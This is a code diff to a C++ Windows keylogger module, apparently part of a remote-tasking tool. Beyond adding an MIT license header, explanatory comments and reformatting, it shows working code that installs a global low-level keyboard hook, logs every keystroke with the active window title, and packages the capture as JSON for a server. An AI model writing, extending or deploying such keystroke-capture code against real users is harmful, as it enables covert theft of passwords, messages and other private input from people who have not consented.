@@ -1,3 +1,27 @@
+/*
+MIT License
+
+Copyright (c) 2025 solveditnpc
+
+Permission is hereby granted, free of charge, to any person obtaining a copy
+of this software and associated documentation files (the "Software"), to deal
+in the Software without restriction, including without limitation the rights
+to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
+copies of the Software, and to permit persons to whom the Software is
+furnished to do so, subject to the following conditions:
+
+The above copyright notice and this permission notice shall be included in all
+copies or substantial portions of the Software.
+
+THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
+OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
+SOFTWARE.
+*/
+
 #include "Keylogger.h"
 
 #include <chrono>
@@ -11,6 +35,7 @@ Keylogger::~Keylogger()
 
 Response Keylogger::keylog_start(const int &taskID)
 {
+    // Only one Keylogger instance may own the global keyboard hook.
     Keylogger *expected = nullptr;
     if (!active_instance.compare_exchange_strong(expected, this))
     {
@@ -19,6 +44,7 @@ Response Keylogger::keylog_start(const int &taskID)
     }
 
     {
+        // Reset the current capture so each start returns an independent batch.
         std::lock_guard lock(state_mutex);
         first_json_entry = true;
         keylog_data = "[";
@@ -34,6 +60,7 @@ Response Keylogger::keylog_start(const int &taskID)
 
 void Keylogger::hook_loop()
 {
+    // The low-level hook requires a message loop on the thread that owns it.
     hook_thread_id = GetCurrentThreadId();
     keyboard_hook = SetWindowsHookEx(WH_KEYBOARD_LL, hook_proc, GetModuleHandle(NULL), 0);
     if (keyboard_hook == NULL)
@@ -45,6 +72,8 @@ void Keylogger::hook_loop()
     MSG message;
     while (logging_enabled)
     {
+        // Pump hook messages while allowing stop() to signal this thread with
+        // WM_QUIT.
         while (PeekMessage(&message, NULL, 0, 0, PM_REMOVE))
         {
             if (message.message == WM_QUIT)
@@ -74,6 +103,7 @@ bool Keylogger::keylog_stop()
         PostThreadMessage(hook_thread_id, WM_QUIT, 0, 0);
     if (hook_thread.joinable())
         hook_thread.join();
+    // Release ownership only after the hook thread has fully stopped.
     active_instance.compare_exchange_strong(instance, nullptr);
     return true;
 }
@@ -98,27 +128,57 @@ LRESULT CALLBACK Keylogger::hook_proc(int code, WPARAM wParam, LPARAM lParam)
 
         if (wParam == WM_KEYDOWN)
         {
+            // Store normalized labels for control keys and mapped characters
+            // for ordinary keys so the server receives consistent events.
             std::string value;
             switch (key->vkCode)
             {
-            case VK_RETURN: value = "(ENTER)\n"; break;
-            case VK_BACK: value = "(BACKSPACE)"; break;
-            case VK_SPACE: value = " "; break;
-            case VK_TAB: value = "(TAB)"; break;
+            case VK_RETURN:
+                value = "(ENTER)\n";
+                break;
+            case VK_BACK:
+                value = "(BACKSPACE)";
+                break;
+            case VK_SPACE:
+                value = " ";
+                break;
+            case VK_TAB:
+                value = "(TAB)";
+                break;
             case VK_SHIFT:
             case VK_LSHIFT:
-            case VK_RSHIFT: value = "(SHIFT)"; break;
+            case VK_RSHIFT:
+                value = "(SHIFT)";
+                break;
             case VK_CONTROL:
             case VK_LCONTROL:
-            case VK_RCONTROL: value = "(CTRL)"; break;
-            case VK_ESCAPE: value = "(ESCAPE)"; break;
-            case VK_END: value = "(END)"; break;
-            case VK_HOME: value = "(HOME)"; break;
-            case VK_LEFT: value = "(LEFT)"; break;
-            case VK_UP: value = "(UP)"; break;
-            case VK_RIGHT: value = "(RIGHT)"; break;
-            case VK_DOWN: value = "(DOWN)"; break;
-            case VK_DELETE: value = "(DELETE)"; break;
+            case VK_RCONTROL:
+                value = "(CTRL)";
+                break;
+            case VK_ESCAPE:
+                value = "(ESCAPE)";
+                break;
+            case VK_END:
+                value = "(END)";
+                break;
+            case VK_HOME:
+                value = "(HOME)";
+                break;
+            case VK_LEFT:
+                value = "(LEFT)";
+                break;
+            case VK_UP:
+                value = "(UP)";
+                break;
+            case VK_RIGHT:
+                value = "(RIGHT)";
+                break;
+            case VK_DOWN:
+                value = "(DOWN)";
+                break;
+            case VK_DELETE:
+                value = "(DELETE)";
+                break;
             default:
             {
                 char character = static_cast<char>(MapVirtualKey(key->vkCode, MAPVK_VK_TO_CHAR));
@@ -136,6 +196,7 @@ LRESULT CALLBACK Keylogger::hook_proc(int code, WPARAM wParam, LPARAM lParam)
 
 Response Keylogger::get_keylog_data(const int &taskID)
 {
+    // Stop capture before taking the snapshot to prevent concurrent mutation.
     keylog_stop();
     std::string result;
     {
@@ -157,12 +218,24 @@ std::string Keylogger::escape_json(const std::string &value)
     {
         switch (character)
         {
-        case '\\': escaped += "\\\\"; break;
-        case '"': escaped += "\\\""; break;
-        case '\n': escaped += "\\n"; break;
-        case '\r': escaped += "\\r"; break;
-        case '\t': escaped += "\\t"; break;
-        default: escaped += character; break;
+        case '\\':
+            escaped += "\\\\";
+            break;
+        case '"':
+            escaped += "\\\"";
+            break;
+        case '\n':
+            escaped += "\\n";
+            break;
+        case '\r':
+            escaped += "\\r";
+            break;
+        case '\t':
+            escaped += "\\t";
+            break;
+        default:
+            escaped += character;
+            break;
         }
     }
     return escaped;
@@ -176,6 +249,7 @@ void Keylogger::append_json_event(const std::string &type, const std::string &va
     std::lock_guard lock(state_mutex);
     if (!first_json_entry)
         keylog_data += ",";
+    // Escape each field before appending it to the in-memory JSON document.
     keylog_data += "\n  {\"type\":\"" + escape_json(type) +
                    "\",\"value\":\"" + escape_json(value) +
                    "\",\"window\":\"" + escape_json(window) + "\"}";
